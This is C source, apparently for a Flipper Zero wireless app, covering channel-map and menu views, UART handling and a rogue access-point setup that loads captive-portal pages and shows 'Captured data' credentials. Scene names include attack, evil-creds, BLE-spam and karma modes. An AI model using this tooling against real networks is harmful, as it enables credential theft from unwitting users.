               (s->cnt5[j] == best_cost && s->best5 > 0 && s->ch5[j] < s->best5)) {
                best_cost = s->cnt5[j];
                s->best5 = s->ch5[j];
            }
        }
    }
}

static void channel_map_draw(Canvas* canvas, void* model) {
    ChanModel* m = model;
    ChanStats* s = &m->s;
    canvas_clear(canvas);
    canvas_set_color(canvas, ColorBlack);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 2, 10, "Channel Map");
    canvas_set_font(canvas, FontSecondary);

    int total = s->total24 + s->total5;
    if(total == 0) {
        canvas_draw_str_aligned(canvas, 64, 34, AlignCenter, AlignCenter, "No scan data");
        canvas_draw_str_aligned(canvas, 64, 46, AlignCenter, AlignCenter, "Run Scan first");
        return;
    }
    char hstat[20];
    snprintf(hstat, sizeof(hstat), "%d APs", total);
    canvas_draw_str_aligned(canvas, 126, 11, AlignRight, AlignBottom, hstat);

    // Unified axis: present 2.4G channels, then present 5G channels (sorted).
    uint8_t uch[40], ucnt[40];
    bool ubest[40];
    int nu = 0;
    for(int ch = 1; ch <= 13 && nu < 40; ch++) {
        if(s->count24[ch] > 0) {
            uch[nu] = ch;
            ucnt[nu] = s->count24[ch];
            ubest[nu] = (ch == s->best24);
            nu++;
        }
    }
    int first5 = nu;
    for(int j = 0; j < s->n5 && nu < 40; j++) {
        uch[nu] = s->ch5[j];
        ucnt[nu] = s->cnt5[j];
        ubest[nu] = (s->ch5[j] == s->best5);
        nu++;
    }
    int maxc = s->max24 > s->max5 ? s->max24 : s->max5;
    if(maxc < 1) maxc = 1;

    const int base_y = 47, top_y = 16;
    int start = m->scroll;
    if(start < 0) start = 0;
    if(start > nu - 1) start = nu - 1;
    int end = start + CHAN_VIS;
    if(end > nu) end = nu;
    for(int i = start; i < end; i++) {
        int x = 6 + (i - start) * CHAN_SLOT;
        int h = 1 + (ucnt[i] * (base_y - top_y)) / maxc;
        int bw = CHAN_SLOT - 5;
        if(ubest[i])
            canvas_draw_box(canvas, x, base_y - h, bw, h); // filled = recommended
        else
            canvas_draw_frame(canvas, x, base_y - h, bw, h); // outline = busy
        char cl[6];
        snprintf(cl, sizeof(cl), "%d", uch[i]);
        int clw = canvas_string_width(canvas, cl);
        canvas_draw_str(canvas, x + (bw - clw) / 2, base_y + 9, cl);
        if(i == first5 && i > start)
            canvas_draw_line(canvas, x - 3, top_y, x - 3, base_y); // 2.4G | 5G divider
    }
    canvas_draw_line(canvas, 0, base_y, 127, base_y);
    if(start > 0) canvas_draw_str(canvas, 0, 33, "<");
    if(end < nu) canvas_draw_str(canvas, 123, 33, ">");

    if(s->total24 > 0 && s->total5 > 0) {
        char f24[20], f5[16];
        snprintf(f24, sizeof(f24), "2.4G fewest: %d", s->best24);
        snprintf(f5, sizeof(f5), "5G fewest: %d", s->best5);
        canvas_draw_str(canvas, 2, 63, f24);
        canvas_draw_str(canvas, 126 - canvas_string_width(canvas, f5), 63, f5);
    } else {
        char foot[28];
        if(s->total24 > 0) snprintf(foot, sizeof(foot), "2.4G fewest APs: %d", s->best24);
        else snprintf(foot, sizeof(foot), "5G fewest APs: %d", s->best5);
        canvas_draw_str(canvas, 2, 63, foot);
    }
}

static bool channel_map_input(InputEvent* event, void* context) {
    Petrel* app = context;
    if(event->type != InputTypeShort && event->type != InputTypeRepeat) return false;
    bool handled = false;
    with_view_model(
        app->chanMapView,
        ChanModel * m,
        {
            int maxs = m->nu - CHAN_VIS;
            if(maxs < 0) maxs = 0;
            if(event->key == InputKeyLeft || event->key == InputKeyUp) {
                if(m->scroll > 0) m->scroll--;
                handled = true;
            } else if(event->key == InputKeyRight || event->key == InputKeyDown) {
                if(m->scroll < maxs) m->scroll++;
                handled = true;
            }
        },
        true);
    return handled;
}

void channel_map_scene_on_enter(void* context) {
    Petrel* app = context;
    with_view_model(
        app->chanMapView,
        ChanModel * m,
        {
            channel_compute_stats(&m->s, app);
            int nu = 0;
            for(int ch = 1; ch <= 13; ch++)
                if(m->s.count24[ch] > 0) nu++;
            nu += m->s.n5;
            m->nu = nu;
            m->scroll = 0;
        },
        true);
    view_dispatcher_switch_to_view(app->view_dispatcher, channelMapView);
}

bool channel_map_scene_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}

void channel_map_scene_on_exit(void* context) {
    UNUSED(context);
}

// Card-grid main menu (2x2) with real vector glyphs for Wi-Fi and Bluetooth.
static int card_sel = 0;
// Just the two radios. Exit was a fourth card, but BACK already leaves the app (the back handler
// stops the dispatcher when there is no previous scene); the about/help pill went the same way.
#define CARD_COUNT 2
static const char* card_labels[CARD_COUNT] = {"Wi-Fi", "BLE"};

static void card_menu_draw(Canvas* canvas, void* model) {
    UNUSED(model);
    if(card_sel < 0 || card_sel >= CARD_COUNT) card_sel = 0;
    canvas_clear(canvas);
    // No title line: the two cards fill the whole screen. Icon above, big label under it.
    for(int i = 0; i < CARD_COUNT; i++) {
        int x = 3 + i * 62, y = 1, w = 60, h = 61;
        bool sel = (i == card_sel);
        if(sel) canvas_draw_box(canvas, x, y, w, h);
        else canvas_draw_frame(canvas, x, y, w, h);
        if(sel) canvas_set_color(canvas, ColorWhite);
        canvas_draw_icon(canvas, x + 24, y + 16, (i == 0) ? &I_wifi : &I_bluetooth);
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str_aligned(
            canvas, x + w / 2, y + 36, AlignCenter, AlignTop, card_labels[i]);
        canvas_set_font(canvas, FontSecondary);
        if(sel) canvas_set_color(canvas, ColorBlack);
    }
}
static bool card_menu_input(InputEvent* event, void* context) {
    Petrel* app = context;
    if(event->type != InputTypeShort && event->type != InputTypeRepeat) return false;
    if(event->key == InputKeyLeft || event->key == InputKeyRight || event->key == InputKeyUp ||
       event->key == InputKeyDown) {
        if(event->key == InputKeyLeft) card_sel = (card_sel + CARD_COUNT - 1) % CARD_COUNT;
        else card_sel = (card_sel + 1) % CARD_COUNT;
    } else if(event->key == InputKeyOk) {
        if(card_sel == 0) scene_manager_next_scene(app->scene_manager, wifiHubScene);
        else scene_manager_next_scene(app->scene_manager, bleHubScene);
    } else {
        return false;
    }
    view_commit_model(app->cardView, true);          // refresh so the highlight moves
    return true;
}

void ap_config_enter_call_back(void* context, uint32_t index) {
    UNUSED(index);
    UNUSED(context);
}

void security_change_callback(VariableItem* item) {
    FURI_LOG_D(TAG, __func__);
    int index = variable_item_get_current_value_index(item);
    Petrel* app = variable_item_get_context(item);
    variable_item_set_current_value_text(item, securityType[index]);
    app->securityAP = index;
    // Post, never call config_ap_scene_on_enter() here: it resets the list we are dispatching from
    // (the password row appears/disappears with the security type).
    post_event(app, PETREL_EVT_REBUILD_VIL);
}

void channel_change_callback(VariableItem* item) {
    FURI_LOG_D(TAG, __func__);
    int index = variable_item_get_current_value_index(item);
    Petrel* app = variable_item_get_context(item);
    //variable_item_set_current_value_text(item, securityType[index]);
    app->channelAP = index;
    post_event(app, PETREL_EVT_REBUILD_VIL);
}

void config_ap_change_call_back(void* context, uint32_t index) {
    FURI_LOG_D(TAG, __func__);
    FURI_LOG_D(TAG, "%p %ld", context, index);
    Petrel* app = context;
    if((int)index == app->ap_idx_name) {
        // This is the variable item list's ENTER callback, so anything that touches views here runs
        // inside the list's own dispatch. Post the transition instead; config_ap_scene_on_event
        // performs it between frames.
        post_event(app, PETREL_EVT_AP_EDIT_NAME);
    } else if((int)index == app->ap_idx_pass) {
        post_event(app, PETREL_EVT_AP_EDIT_PASSWORD);
    } else if((int)index == app->ap_idx_load) {
        scene_manager_next_scene(app->scene_manager, portalListScene); // pick .html from /ext/petrel/portals
    } else if((int)index == app->ap_idx_start) {
        // Everything here used to run inline: four state commands each followed by
        // furi_delay_ms(150) and then a scene switch - ~600 ms of frozen input, from inside the
        // variable-item list's own enter callback. Post it; config_ap_scene_on_event does the work
        // between frames (and the sleeps are gone: the board processes every line now).
        post_event(app, PETREL_EVT_AP_START);
    }
}

void config_ap_scene_on_enter(void* context) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;
    VariableItem* item;
    app->menuIndex = CreateAP;
    credentials[0] = '\0';
    // Remember the row: this function is also the rebuild path of the security/channel change
    // callbacks, so pinning the selection to 0 made the cursor jump to the top on every change.
    uint8_t keep_row = variable_item_list_get_selected_item_index(app->variableList);
    variable_item_list_reset(app->variableList);
    // reset() frees the items but leaves model->position/window_position untouched, so a position
    // left over from a longer list survives. The enter callback is handed model->position, and
    // get_selected_item() walks position steps into the (now shorter) array without a bounds guard
    // and returns a pointer past the end - pressing OK then dereferences it. Pin the selection to 0.
    variable_item_list_set_selected_item(app->variableList, 0);
    int idx = 0;
    app->ap_idx_name = idx++;
    item = variable_item_list_add(app->variableList, "AP NAME", 1, NULL, NULL);
    variable_item_set_current_value_text(item, app->ssidAP);
    variable_item_set_current_value_index(item, 0);

    idx++; // SECURITY
    item = variable_item_list_add(app->variableList, "SECURITY", 2, security_change_callback, app);
    variable_item_set_current_value_text(item, securityType[app->securityAP]);
    variable_item_set_current_value_index(item, app->securityAP);

    app->ap_idx_pass = -1;
    if(app->securityAP != 0) {
        app->ap_idx_pass = idx++;
        item = variable_item_list_add(app->variableList, "Password", 1, NULL, NULL);
        variable_item_set_current_value_text(item, app->passwordAP);
        variable_item_set_current_value_index(item, 0);
    }

    idx++; // Channel
    item = variable_item_list_add(app->variableList, "Channel", 59, channel_change_callback, app);
    variable_item_set_current_value_text(item, channelList[app->channelAP]);
    variable_item_set_current_value_index(item, app->channelAP);

    idx++; // Portal Type
    item = variable_item_list_add(
        app->variableList, "Portal Type", CAPTIVE_PORTAL_SIZE, portal_type_change_call_back, app);
    variable_item_set_current_value_index(item, app->captivePortal);
    variable_item_set_current_value_text(item, captive_portals[app->captivePortal]);

    // Load Portal file -> opens the /ext/petrel/portals browser (right below Portal Type)
    app->ap_idx_load = idx++;
    variable_item_list_add(app->variableList, "Load Portal file", 0, NULL, NULL);

    idx++; // Mac Type
    item =
        variable_item_list_add(app->variableList, "Mac Type", 3, mac_type_change_call_back, app);
    variable_item_set_current_value_index(item, app->mac_type);
    variable_item_set_current_value_text(item, mac_type[app->mac_type]);

    if(app->mac_type == 2) {
        idx++;
        item = variable_item_list_add(app->variableList, app->customMac, 0, NULL, NULL);
    }
    app->ap_idx_start = idx++;
    item = variable_item_list_add(app->variableList, "Start", 1, NULL, NULL);
    variable_item_list_set_enter_callback(app->variableList, config_ap_change_call_back, app);

        // put the cursor back where it was (clamped to the rebuilt list)
    variable_item_list_set_selected_item(app->variableList, keep_row);
view_dispatcher_switch_to_view(app->view_dispatcher, configAPView);
}

bool config_ap_scene_on_event(void* context, SceneManagerEvent event) {
    FURI_LOG_D(TAG, __func__);
    Petrel* app = context;

    FURI_LOG_I("Petrel", "%s event.type: %d", __func__, event.type);
    FURI_LOG_I("Petrel", "%s event.event: %ldd", __func__, event.event);
    char cadena[40];
    switch(event.type) {
    case SceneManagerEventTypeCustom:
        switch(event.event) {
        case PETREL_EVT_AP_EDIT_NAME:
            text_input_reset(app->text_input);
            text_input_set_header_text(app->text_input, "Acces Point Name");
            text_input_set_result_callback(
                app->text_input,
                config_ap_scene_on_enter,
                app,
                app->ssidAP,
                app->ssidAPLength,
                true);
            view_dispatcher_switch_to_view(app->view_dispatcher, apNameTextInputView);
            return true;
        case PETREL_EVT_AP_EDIT_PASSWORD:
            text_input_reset(app->text_input);
            text_input_set_header_text(app->text_input, "Acces Point Password");
            text_input_set_result_callback(
                app->text_input,
                config_ap_scene_on_enter,
                app,
                app->passwordAP,
                app->passwordAPLength,
                true);
            view_dispatcher_switch_to_view(app->view_dispatcher, apPasswordTextInputView);
            return true;
        case PETREL_EVT_REBUILD_VIL:
            // Deferred rebuild requested by security_change_callback / channel_change_callback /
            // mac_type_change_call_back. Safe here: this runs between frames, not inside the list's
            // own input dispatch. on_enter keeps the currently selected row.
            config_ap_scene_on_enter(app);
            return true;
        case PETREL_EVT_AP_START: {
            // Moved here from config_ap_change_call_back (the list's enter callback). Runs between
            // frames, and the per-command sleeps are gone - the board's loop() now processes every
            // complete line, so back-to-back state commands all take effect.
            char buf[80];
            if(app->securityAP == 1) {
                snprintf(buf, sizeof(buf), "PASSWORD %s\n", app->passwordAP);
                uart_helper_send(app->uart_helper, buf, strlen(buf));
            }
            snprintf(buf, sizeof(buf), "APMAC %s\n", app->customMac);
            uart_helper_send(app->uart_helper, buf, strlen(buf));
            snprintf(buf, sizeof(buf), "CHANNEL %s\n", channelList[app->channelAP]);
            uart_helper_send(app->uart_helper, buf, strlen(buf));
            petrel_send_portal_sel(app);
            snprintf(buf, sizeof(buf), "APSTART %s\n", app->ssidAP);
            uart_helper_send(app->uart_helper, buf, strlen(buf));
            scene_manager_next_scene(app->scene_manager, evilCredsScene);
            return true;
        }
        case SsidAPInputSceneSaveEvent:
            FURI_LOG_D(TAG, "ssidAPLenght %d", strlen(app->ssidAP));

            snprintf(cadena, sizeof(cadena), "BSSID %s\n", app->ssidAP); // bound by buffer, not SSID len (M1)
            FURI_LOG_D(TAG, "%s", cadena);
            break;
        }
        return true;
    default:
        break;
    }
    return false;
}

void config_ap_scene_on_exit(void* context) {
    UNUSED(context);
}

//Array de Event Handlers
void (*const Petrel_scene_on_enter_handlers[])(void*) = {
    main_menu_scene_on_enter,
    scan_networks_scene_on_enter,
    list_networks_scene_on_enter,
    info_wifi_scene_on_enter,
    config_attack_scene_on_enter,
    evil_creds_scene_on_enter,
    custom_ap_mac_scene_on_enter,
    beacon_network_scene_on_enter,
    custom_beacon_scene_on_enter,
    beacon_info_scene_on_enter,
    config_ap_scene_on_enter,
    help_scene_on_enter,
    popup_scene_on_enter,
    busy_scene_on_enter,
    pmf_scene_on_enter,
    tools_menu_scene_on_enter,
    channel_map_scene_on_enter,
    ble_adv_input_scene_on_enter,
    ibeacon_input_scene_on_enter,
    wifi_hub_scene_on_enter,
    ble_hub_scene_on_enter,
    ble_adv_lib_scene_on_enter,
    portal_list_scene_on_enter, settings_scene_on_enter, session_scene_on_enter, gatt_scene_on_enter, blespam_scene_on_enter, tracker_scene_on_enter, browse_scene_on_enter, karma_scene_on_enter, script_list_scene_on_enter, script_run_scene_on_enter, record_scene_on_enter, pick_ap_scene_on_enter, batch_scene_on_enter};

bool (*const Petrel_scene_on_event_handlers[])(void*, SceneManagerEvent) = {
    main_menu_scene_on_event,
    scan_networks_scene_on_event,
    list_networks_scene_on_event,
    info_wifi_scene_on_event,
    config_attack_scene_on_event,
    evil_creds_scene_on_event,
    custom_ap_mac_scene_on_event,
    beacon_network_scene_on_event,
    custom_beacon_scene_on_event,
    beacon_info_scene_on_event,
    config_ap_scene_on_event,
    help_scene_on_event,
    popup_scene_on_event,
    busy_scene_on_event,
    pmf_scene_on_event,
    tools_menu_scene_on_event,
    channel_map_scene_on_event,
    ble_adv_input_scene_on_event,
    ibeacon_input_scene_on_event,
    wifi_hub_scene_on_event,
    ble_hub_scene_on_event,
    ble_adv_lib_scene_on_event,
    portal_list_scene_on_event, settings_scene_on_event, session_scene_on_event, gatt_scene_on_event, blespam_scene_on_event, tracker_scene_on_event, browse_scene_on_event, karma_scene_on_event, script_list_scene_on_event, script_run_scene_on_event, record_scene_on_event, pick_ap_scene_on_event, batch_scene_on_event};

void (*const Petrel_scene_on_exit_handlers[])(void*) = {
    main_menu_scene_on_exit,
    scan_networks_scene_on_exit,
    list_networks_scene_on_exit,
    info_wifi_scene_on_exit,
    config_attack_scene_on_exit,
    evil_creds_scene_on_exit,
    custom_ap_mac_scene_on_exit,
    beacon_network_scene_on_exit,
    custom_beacon_scene_on_exit,
    beacon_info_scene_on_exit,
    config_ap_scene_on_exit,
    help_scene_on_exit,
    popup_scene_on_exit,
    busy_scene_on_exit,
    pmf_scene_on_exit,
    tools_menu_scene_on_exit,
    channel_map_scene_on_exit,
    ble_adv_input_scene_on_exit,
    ibeacon_input_scene_on_exit,
    wifi_hub_scene_on_exit,
    ble_hub_scene_on_exit,
    ble_adv_lib_scene_on_exit,
    portal_list_scene_on_exit, settings_scene_on_exit, session_scene_on_exit, gatt_scene_on_exit, blespam_scene_on_exit, tracker_scene_on_exit, browse_scene_on_exit, karma_scene_on_exit, script_list_scene_on_exit, script_run_scene_on_exit, record_scene_on_exit, pick_ap_scene_on_exit, batch_scene_on_exit};

static const SceneManagerHandlers Petrel_scene_manager_handlers = {
    .on_enter_handlers = Petrel_scene_on_enter_handlers,
    .on_event_handlers = Petrel_scene_on_event_handlers,
    .on_exit_handlers = Petrel_scene_on_exit_handlers,
    .scene_num = PetrelSceneCount,
};

// Reuse asynchronous result scenes instead of accumulating navigation history. scene_manager_next_scene
// has NO depth limit in this firmware, so a result/error arriving repeatedly (each posting
// PETREL_EVT_RECON / POPUP / CREDS) pushed a new scene every time and grew memory without bound.
// If the destination is already current, refresh it in place; else return to an existing instance of
// it; only push when there is none.
static void petrel_show_result(Petrel* app, uint32_t scene_id) {
    diag(5, scene_id, 0);
    if(scene_manager_get_current_scene(app->scene_manager) == scene_id) {
        Petrel_scene_on_enter_handlers[scene_id](app);
    } else if(!scene_manager_search_and_switch_to_previous_scene(app->scene_manager, scene_id)) {
        scene_manager_next_scene(app->scene_manager, scene_id);
    }
}

static bool Petrel_custom_callback(void* context, uint32_t custom_event) {
    FURI_LOG_D(TAG, __func__);
    furi_assert(context);
    Petrel* app = context;
    // Deferred GUI transitions posted from the UART worker thread (runs on the GUI thread).
    // A completion (result popup / recon view) arrives while the animated busy scene is the
    // current scene. Pop it first, else the result lands ON TOP of the spinner and BACK
    // falls back into the spinner ("busy <-> result" loop). The ERROR: path can arrive
    // with no busy scene, hence the busy_active guard.
    if(custom_event == PETREL_EVT_RECON) {
        if(script_running) return true;   // F1: keep result views off the script runner
        if(busy_active) scene_manager_previous_scene(app->scene_manager);
        petrel_show_result(app, pmfScene);
        return true;
    }
    if(custom_event == PETREL_EVT_POP) {
        // 2026-10-29: popping the hub from inside the submenu callback wedged the input loop.
        // Do it here, in the dispatcher's own event context.
        (void)scene_manager_previous_scene(app->scene_manager);
        return true;
    }
    if(custom_event == PETREL_EVT_POPUP) {
        if(script_running) return true;   // F1: ditto for the per-command popups
        if(busy_active) {
            diag(31, 3, 0); /* busy popup previous_scene begin */
            (void)scene_manager_previous_scene(app->scene_manager);
            diag(31, 3, 1);
        }
        diag(32, 2, 0);
        petrel_show_result(app, popupScene);
        diag(32, 2, 1);
        return true;
    }
    if(custom_event == PETREL_EVT_CREDS) {
        sess_creds++;
        if(set_vibro) {
            furi_hal_vibro_on(true);
            furi_delay_ms(120);
            furi_hal_vibro_on(false);
        }
        if(!creds_scene_shown) {
            petrel_show_result(app, evilCredsScene);
        } else {
            // Already on the captured-data screen: refresh the text in place. Pushing the
            // scene again on every credential re-entered it (on_exit ran each time).
            widget_reset(app->widget);
            widget_add_string_multiline_element(
                app->widget, 64, 4, AlignCenter, AlignTop, FontSecondary, "Captured data");
            widget_add_text_scroll_element(app->widget, 0, 16, 128, 50, credentials);
        }
        return true;
    }
    return scene_manager_handle_custom_event(app->scene_manager, custom_event);
}

bool Petrel_back_event_callback(void* context) {
    FURI_LOG_D(TAG, __func__);
    furi_assert(context);
    Petrel* app = context;
    return scene_manager_handle_back_event(app->scene_manager);
}

void uart_process_line(FuriString* line, void* context);

// UART worker side: take a copy of the line and hand it to the dispatcher thread. Never touch scene
// state from here. If the queue is full we retry, but keep checking the worker's exit flag so that
// closing the app cannot deadlock on a queue nobody drains any more.
static void uart_enqueue_line(FuriString* line, void* context) {
    Petrel* app = context;
    if(uart_helper_worker_is_stopping()) return;
    diag(11, (uint32_t)furi_string_size(line), 0);   // about to copy a line into the queue
    FuriString* copy = furi_string_alloc_set(line);
    for(;;) {
        if(uart_helper_worker_is_stopping()) {
            furi_string_free(copy);
            return;
        }
        if(furi_message_queue_put(app->uart_lines, &copy, furi_ms_to_ticks(10)) == FuriStatusOk) {
            return; // the queue owns copy now
        }
    }
}

// M0.3: decoded DP_SCAN_AP frame -> reformat to the canonical "AP:" line and enqueue on the SAME
// GUI-thread queue the ASCII path uses. wifiList therefore stays written only on the GUI thread (no
// worker-vs-GUI race, per the wifiList comments) and the existing AP: parser handles it unchanged.
// Runs on the UART worker thread. Payload: idx|total|bssid[6]|ch|sec(u32 LE)|rssi(i16 LE)|ssid_len|ssid.
static void petrel_scan_frame(uint8_t type, const uint8_t* p, uint16_t len, void* context) {
    Petrel* app = context;
    if(type != DP_SCAN_AP || len < 2) return;
    uint8_t idx = p[0];
    uint8_t total = p[1];
    if(total == 0) return; // empty-list marker, nothing to add
    if(len < 16) return; // idx,total,bssid[6],ch,sec(4),rssi(2) = 15, then ssid_len at [15]
    uint8_t sl = p[15];
    if(sl > 32) sl = 32;
    if(len < (uint16_t)(16 + sl)) return;
    int16_t rssi = (int16_t)((uint16_t)p[13] | ((uint16_t)p[14] << 8));
    uint32_t sec = (uint32_t)p[9] | ((uint32_t)p[10] << 8) | ((uint32_t)p[11] << 16) |
                   ((uint32_t)p[12] << 24);
    // Sanitise SSID to printable, non-'|' so a binary SSID cannot corrupt the '|'-delimited AP: line.
    char ssid[33];
    for(uint8_t i = 0; i < sl; i++) {
        char c = (char)p[16 + i];
        ssid[i] = (c >= 0x20 && c < 0x7f && c != '|') ? c : '?';
    }
    ssid[sl] = '\0';
    char linebuf[128];
    snprintf(
        linebuf,
        sizeof(linebuf),
        "AP:%u|%s|%02X:%02X:%02X:%02X:%02X:%02X|%u|%u|%d",
        (unsigned)idx,
        ssid,
        p[2], p[3], p[4], p[5], p[6], p[7],
        (unsigned)p[8],
        (unsigned)sec,
        (int)rssi);
    FuriString* fs = furi_string_alloc_set_str(linebuf);
    uart_enqueue_line(fs, app); // copies into the GUI queue; parsed into wifiList there
    furi_string_free(fs);
    scan_expect_total = total;   // GUI thread persists the list once it has parsed this many APs
}

// Dispatcher thread: drain what the worker queued, and finish the scan wait. One line per call so
// that custom events posted by the line handlers are serviced in between.
static void uart_gui_tick(void* context) {
    Petrel* app = context;
    // M4: night LED auto-off. The Flipper has an RTC; the board does not. Once a minute, if we are
    // in the night window (22:00-06:59) tell the board to go dark ("LED OFF" latches led_quiet so
    // status blinks stay off too), and "LED ON" (resume) when day returns. Edge-triggered: one
    // command only on the day<->night boundary (and once on app open to sync).
    {
        static uint32_t led_night_last = 0;
        static int led_night_state = -1;  // -1 unknown, 0 day, 1 night
        uint32_t nowt = furi_get_tick();
        if(led_night_last == 0 || (nowt - led_night_last) >= furi_ms_to_ticks(60000)) {
            led_night_last = nowt;
            DateTime dt;
            furi_hal_rtc_get_datetime(&dt);
            int night = (dt.hour >= 22 || dt.hour < 7) ? 1 : 0;
            if(night != led_night_state) {
                led_night_state = night;
                uart_helper_send(app->uart_helper, night ? "LED OFF\n" : "LED ON\n", night ? 8 : 7);
            }
        }
    }
    // Drain the app-owned event ring FIRST. These are the events the producers (this tick, the
    // UART line handlers, the timer callbacks) must not hand to the dispatcher directly, because
    // view_dispatcher_send_custom_event() blocks forever on a full queue. The scene manager runs
    // exactly the on_event handlers the dispatcher would have run, just without the 16-slot queue.
    uint32_t ev;
    for(int i = 0; i < 16; i++) {
        if(!take_event(&ev)) break;
        // Route through the dispatcher's custom-event callback: it owns the outcomes shared by every
        // screen (result view, popup scene, credentials + vibration) and it ends with
        // "return scene_manager_handle_custom_event(...)", so a scene event still reaches the current
        // scene. Calling scene_manager directly - as the ring did since item #1 - bypassed all of
        // that and silently killed every popup and the results view.
        // ONE call. An earlier attempt did "callback first, fall back if it returns false", which
        // runs an unconsumed scene event twice (and possibly against a different current scene once
        // the first call has moved it).
        diag(4, ev, 0);
        (void)Petrel_custom_callback(app, ev);
    }
    // Self-test driver (architect D.5): one step when due. Longer pauses around the scan so the
    // board has time to answer, which is what the production flow waits for too.
    if(st_active) {
        uint32_t nowt = furi_get_tick();
        if((int32_t)(nowt - st_due) >= 0) {
            st_due = nowt + furi_ms_to_ticks((st_step == 2 || st_step == 3) ? 1500 : 300);
            selftest_step(app);
        }
    }
    // One heap/queue sample per second: the leak detector. free_now is the live free heap, largest
    // the biggest allocatable block. boot_min (memmgr_get_minimum_free_heap) is a low-water mark
    // SINCE BOOT: it can never recover, so a falling boot_min on its own proves nothing. A leak is a
    // sustained decline of free_now/largest across equivalent phases, which is why the sample now
    // records the phase it was taken in.
    {
        static uint32_t last_sample = 0;
        uint32_t nowt = furi_get_tick();
        if((uint32_t)(nowt - last_sample) >= furi_ms_to_ticks(1000)) {
            last_sample = nowt;
            // Phase-tagged (architect's soak requirement): the sample carries the scene and whether
            // a scan is in flight, so equivalent phases can be compared across laps for a leak.
            diag(1, (uint32_t)scene_manager_get_current_scene(app->scene_manager),
                 app->scan_waiting ? 1u : 0u);
        }
    }
    // Re-identify an unidentified board. The app learns the capability string once, from the reply
    // to HELLO at startup - so if the board happened to be silent right then (mid-boot, or held in
    // ROM download mode by a test), fw_caps stayed empty for the rest of the session and, since
    // item 0.6, every capability-gated row disappeared with no way back. Ask again until it
    // answers, a few seconds apart, and stop as soon as we have an identity.
    if(app->fw_caps[0] == '\0' && app->ident_attempts < 3) petrel_ident(app);
    // A failed save is worth interrupting for - the alternative was silence, so the user believed
    // the artifact was on the card. Consumed ONCE per failure via the sequence number, never once
    // per tick: each popup pushes a scene, and the scene history has no depth limit.
    static uint32_t storage_seen = 0;
    if(storage_fail_seq != storage_seen) {
        storage_seen = storage_fail_seq;
        furi_mutex_acquire(storage_mutex, FuriWaitForever);
        snprintf(message, sizeof(message), "%s", storage_status);
        furi_mutex_release(storage_mutex);
        snprintf(popupHeader, sizeof(popupHeader), "SD problem");
        post_event(app, PETREL_EVT_POPUP);
    }
    FuriString* line;
    // Several lines per tick. This callback runs on the dispatcher (GUI) thread, and with a 10 ms
    // period eight lines per tick is 800 lines/s - far past anything the board emits, at a fraction
    // of the overhead.
    for(int i = 0; i < 8; i++) {
        if(furi_message_queue_get(app->uart_lines, &line, 0) != FuriStatusOk) break;
        uart_process_line(line, app);
        furi_string_free(line);
    }
    // The whole scanned list has been parsed: persist it now instead of waiting for the user to open
    // "List Wifi". Runs on the GUI thread, where wifiList is owned, and petrel_save_wifi_list() has
    // its own low-heap guard.
    // "Or the list is full": a dense RF environment can exceed WIFI_MAX, and the parser stops at 48
    // entries, so waiting for wifiCount to reach the board's `total` would never save anything.
    if(scan_expect_total &&
       (app->wifiCount >= scan_expect_total || app->wifiCount >= WIFI_MAX)) {
        scan_expect_total = 0;
        petrel_save_wifi_list(app);
    }
    if(app->scan_waiting &&
       (scanFinish || scanFailed || (int32_t)(furi_get_tick() - app->scan_deadline) >= 0)) {
        uint32_t reason = scanFailed ? 2u : scanFinish ? 1u : 3u;
        diag(30, 2, reason); /* completion: OK=1, FAIL=2, deadline=3 */
        app->scan_waiting = false;

        if(scanFailed || !scanFinish) {
            // Architect: the deadline WITHOUT a SCAN:OK reply used to enter the SUCCESS branch and
            // send LIST as if fresh results existed - the exact trust bug (0.10/0.12 family). A
            // timed-out scan is now an explicit failure.
            snprintf(message, sizeof(message), "%s\n",
                     scanFailed ? "Scan failed - try again" :
                                  "Scan timed out - no board reply");
            snprintf(popupHeader, sizeof(popupHeader), "Error");
            diag(31, 1, 0); /* failure previous_scene begin */
            bool popped = scene_manager_previous_scene(app->scene_manager);
            diag(31, 1, popped ? 1u : 2u);
            diag(32, 1, 0); /* popup post begin */
            post_event(app, PETREL_EVT_POPUP);
            diag(32, 1, 1);
        } else {
            diag(30, 3, 0); /* submenu reset begin */
            submenu_reset(app->submenu);
            diag(30, 3, 1);
            diag(33, 2, 0); /* LIST send begin */
            uart_helper_send(app->uart_helper, "LISTB\n", 6); // M0.3: binary DP_SCAN_AP list
            diag(33, 2, 1);
            diag(31, 2, 0); /* success previous_scene begin */
            bool popped = scene_manager_previous_scene(app->scene_manager);
            diag(31, 2, popped ? 1u : 2u);
        }
        diag(30, 4, 0); /* completion block returned */
    }
}

void uart_process_line(FuriString* line, void* context) {
    diag(17, (uint32_t)furi_string_size(line), 0);   // input line size
    FURI_LOG_D(TAG, __func__);
    FURI_LOG_D(TAG, "%s", furi_string_get_cstr(line));
    Petrel* app = context;
    {
        // D.4/2 lifecycle breadcrumbs (architect patch 7): the board reports one line per state
        // entry, "D4:<cycle>:<state>:<board_ms>". Kind 21 records cycle/state next to the Flipper's
        // own heap fields, so the USB transcript keeps board timing and the SD keeps the timeline.
        // No storage work is added to this UART callback.
        unsigned long cycle, state, board_ms;
        if(sscanf(furi_string_get_cstr(line), "D4:%lu:%lu:%lu",
                  &cycle, &state, &board_ms) == 3) {
            diag(21, (uint32_t)cycle, (uint32_t)state);
            return;
        }
        // Worker completion (D.4/2): "RD4:<gen>:<op>:<rc>:<w0>:<w1>:<hwm>". b stores rc in two's
        // complement (a negative rc = the call itself failed); the raw USB line keeps w0/w1/hwm.
        unsigned long gen, w0, w1, hwm;
        int rc, opi;
        if(sscanf(furi_string_get_cstr(line), "RD4:%lu:%d:%d:%lu:%lu:%lu",
                  &gen, &opi, &rc, &w0, &w1, &hwm) == 6) {
            diag(22, (uint32_t)opi, (uint32_t)(int32_t)rc);
            return;
        }
    }
    if(strncmp(furi_string_get_cstr(line), "AP:", 3) == 0) {
        if(app->wifiCount >= WIFI_MAX) return; // fixed-size list full
        char buffer[128];
        strncpy(buffer, furi_string_get_cstr(line), sizeof(buffer) - 1);
        buffer[sizeof(buffer) - 1] = '\0';

        char* _sv = NULL;
        char* token = petrel_strtok(buffer, ":|", &_sv); // Omitir "AP:"
        if(!token) return;
        APDetails* newAP = &app->wifiList[app->wifiCount]; // BSS slot, no heap

        token = petrel_strtok(NULL, "|", &_sv); // ID del AP
        if(!token) return;
        newAP->idAP = atoi(token);

        token = petrel_strtok(NULL, "|", &_sv); // SSID
